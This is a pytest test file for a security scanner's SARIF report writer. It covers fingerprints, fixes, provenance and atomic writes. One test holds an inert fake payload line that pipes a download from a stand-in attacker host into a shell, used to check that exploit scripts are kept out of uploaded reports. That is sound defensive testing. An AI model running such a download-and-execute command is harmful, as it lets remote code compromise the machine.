"""Tests for the SARIF 2.1.0 emitter in strix.report.sarif."""

from __future__ import annotations

import json
from typing import TYPE_CHECKING, Any

from strix.report.sarif import write_sarif


if TYPE_CHECKING:
    from pathlib import Path


def _read(run_dir: Path) -> dict[str, Any]:
    doc = json.loads((run_dir / "findings.sarif").read_text(encoding="utf-8"))
    assert isinstance(doc, dict)
    return doc


def _finding(**overrides: Any) -> dict[str, Any]:
    base: dict[str, Any] = {
        "id": "vuln-0001",
        "title": "SQL Injection in get_user",
        "severity": "critical",
        "cwe": "CWE-89",
        "timestamp": "2026-07-02 10:00:00 UTC",
        "code_locations": [{"file": "app.py", "start_line": 4}],
    }
    base.update(overrides)
    return base


def test_write_sarif_basic_shape(tmp_path: Path) -> None:
    write_sarif(tmp_path, [_finding()])
    doc = _read(tmp_path)

    assert doc["version"] == "2.1.0"
    assert "2.1.0" in doc["$schema"]
    run = doc["runs"][0]
    assert run["tool"]["driver"]["name"] == "Strix"
    assert len(run["results"]) == 1
    loc = run["results"][0]["locations"][0]["physicalLocation"]
    assert loc["artifactLocation"]["uri"] == "app.py"
    assert loc["region"]["startLine"] == 4


def test_write_sarif_always_emits_for_zero_findings(tmp_path: Path) -> None:
    # A clean run must still write an (empty) document so a SARIF consumer can
    # auto-resolve alerts that are absent from the new submission.
    out = write_sarif(tmp_path, [])
    assert out.exists()
    doc = _read(tmp_path)
    assert doc["version"] == "2.1.0"
    assert doc["runs"][0]["results"] == []


def test_write_sarif_tool_version_is_reported(tmp_path: Path) -> None:
    write_sarif(tmp_path, [_finding()], tool_version="9.9.9")
    assert _read(tmp_path)["runs"][0]["tool"]["driver"]["version"] == "9.9.9"


def test_write_sarif_locationless_finding_is_anchored_not_dropped(tmp_path: Path) -> None:
    # A finding with no code location must still appear (anchored to a stable
    # fallback), never be silently dropped from the report.
    write_sarif(tmp_path, [_finding(id="vuln-0002", code_locations=None)])
    results = _read(tmp_path)["runs"][0]["results"]
    assert len(results) == 1
    uri = results[0]["locations"][0]["physicalLocation"]["artifactLocation"]["uri"]
    assert uri == "SECURITY.md"


def test_write_sarif_fingerprint_stable_across_title_rewording(tmp_path: Path) -> None:
    # The same finding at the same location with a reworded title must keep the
    # same partialFingerprints, so a re-scan doesn't churn code-scanning alerts.
    a = tmp_path / "a"
    b = tmp_path / "b"
    a.mkdir()
    b.mkdir()
    write_sarif(a, [_finding(title="SQL Injection in get_user")])
    write_sarif(b, [_finding(title="SQLi via string-formatted query in get_user")])

    fp_a = _read(a)["runs"][0]["results"][0]["partialFingerprints"]
    fp_b = _read(b)["runs"][0]["results"][0]["partialFingerprints"]
    assert fp_a == fp_b


def test_write_sarif_distinct_findings_get_distinct_fingerprints(tmp_path: Path) -> None:
    write_sarif(
        tmp_path,
        [
            _finding(
                id="vuln-0001", cwe="CWE-89", code_locations=[{"file": "app.py", "start_line": 4}]
            ),
            _finding(
                id="vuln-0002", cwe="CWE-78", code_locations=[{"file": "cmd.py", "start_line": 4}]
            ),
        ],
    )
    results = _read(tmp_path)["runs"][0]["results"]
    assert len(results) == 2
    fps = {json.dumps(r["partialFingerprints"], sort_keys=True) for r in results}
    assert len(fps) == 2


def test_write_sarif_never_embeds_poc_script(tmp_path: Path) -> None:
    # SARIF is written for external upload; the weaponized exploit body must
    # never appear in it. Only a presence flag + the description are surfaced.
    # NOTE: `marker` is an inert string literal (a stand-in for an exploit
    # payload) that this test asserts is ABSENT from the output — it is never
    # executed, parsed, or run as code.
    marker = "EXPLOIT-PAYLOAD-MARKER curl evil.example/x | sh"
    write_sarif(
        tmp_path,
        [
            _finding(
                poc_description="Send a crafted request to trigger the sink.",
                poc_script_code=marker,
            )
        ],
    )
    raw = (tmp_path / "findings.sarif").read_text(encoding="utf-8")
    assert marker not in raw
    assert "EXPLOIT-PAYLOAD-MARKER" not in raw

    poc = _read(tmp_path)["runs"][0]["results"][0]["properties"]["strix"]["poc"]
    assert poc["script_available"] is True
    assert "script" not in poc
    assert poc["description"] == "Send a crafted request to trigger the sink."


def test_write_sarif_builds_fixes_from_code_location_fix_pairs(tmp_path: Path) -> None:
    # A code location carrying fix_before/fix_after must surface as a SARIF
    # fix (artifactChange/replacement) so consumers can offer a one-click fix.
    write_sarif(
        tmp_path,
        [
            _finding(
                remediation_steps="Use a parameterized query.",
                code_locations=[
                    {
                        "file": "app.py",
                        "start_line": 4,
                        "end_line": 4,
                        "fix_before": 'query = "SELECT * FROM u WHERE id=" + uid',
                        "fix_after": 'query = "SELECT * FROM u WHERE id=%s"',
                    }
                ],
            )
        ],
    )
    result = _read(tmp_path)["runs"][0]["results"][0]
    fixes = result["fixes"]
    assert len(fixes) == 1
    change = fixes[0]["artifactChanges"][0]
    assert change["artifactLocation"]["uri"] == "app.py"
    replacement = change["replacements"][0]
    assert replacement["deletedRegion"]["startLine"] == 4
    assert replacement["insertedContent"]["text"] == 'query = "SELECT * FROM u WHERE id=%s"'


def test_write_sarif_omits_fixes_without_fix_pairs(tmp_path: Path) -> None:
    write_sarif(tmp_path, [_finding()])
    assert "fixes" not in _read(tmp_path)["runs"][0]["results"][0]


def test_write_sarif_adds_logical_location_for_endpoint(tmp_path: Path) -> None:
    # DAST findings hang off an endpoint; it must be preserved as a logical
    # location so the finding keeps an addressable anchor.
    write_sarif(tmp_path, [_finding(endpoint="GET /api/users/{id}")])
    locations = _read(tmp_path)["runs"][0]["results"][0]["locations"]
    logical = [
        entry
        for loc in locations
        for entry in loc.get("logicalLocations", [])
        if entry.get("kind") == "endpoint"
    ]
    assert logical == [{"fullyQualifiedName": "GET /api/users/{id}", "kind": "endpoint"}]


def test_write_sarif_synthetic_finding_falls_back_to_resource_logical_location(
    tmp_path: Path,
) -> None:
    # No code location and no endpoint: the target becomes a resource logical
    # location so a locationless finding still carries a meaningful anchor.
    write_sarif(
        tmp_path,
        [_finding(code_locations=None, endpoint=None, target="https://api.example.com")],
    )
    result = _read(tmp_path)["runs"][0]["results"][0]
    assert result["properties"]["synthetic_location"] is True
    logical = [
        entry
        for loc in result["locations"]
        for entry in loc.get("logicalLocations", [])
        if entry.get("kind") == "resource"
    ]
    assert logical == [{"fullyQualifiedName": "https://api.example.com", "kind": "resource"}]


def test_write_sarif_emits_version_control_provenance(tmp_path: Path) -> None:
    write_sarif(
        tmp_path,
        [_finding()],
        repository_context={
            "repositoryUri": "https://github.com/acme/widget",
            "repositoryFullName": "acme/widget",
            "commitSha": "abc123def456",
            "branch": "main",
            "ref": "refs/heads/main",
        },
    )
    run = _read(tmp_path)["runs"][0]
    assert run["automationDetails"] == {"id": "strix/acme/widget"}
    provenance = run["versionControlProvenance"][0]
    assert provenance == {
        "repositoryUri": "https://github.com/acme/widget",
        "revisionId": "abc123def456",
        "branch": "main",
    }
    assert run["properties"]["repository"] == "acme/widget"
    assert run["properties"]["commit_sha"] == "abc123def456"
    assert run["properties"]["ref"] == "refs/heads/main"


def test_write_sarif_omits_provenance_when_no_repository_context(tmp_path: Path) -> None:
    # DAST / URL scans have no VCS; provenance fields must be absent, not empty.
    write_sarif(tmp_path, [_finding()])
    run = _read(tmp_path)["runs"][0]
    assert "versionControlProvenance" not in run
    assert "automationDetails" not in run


def test_write_sarif_replaces_atomically_no_partial_on_reemit(tmp_path: Path) -> None:
    # A re-emit must land a complete document, never leave a stray temp file
    # or a truncated target alongside it.
    write_sarif(tmp_path, [_finding()])
    write_sarif(tmp_path, [_finding(), _finding(id="vuln-0002", cwe="CWE-78")])

    # Only the final artifact remains — no leftover .tmp siblings.
    leftovers = [p.name for p in tmp_path.iterdir() if p.name != "findings.sarif"]
    assert leftovers == []
    # And it parses as a complete document with both findings.
    assert len(_read(tmp_path)["runs"][0]["results"]) == 2
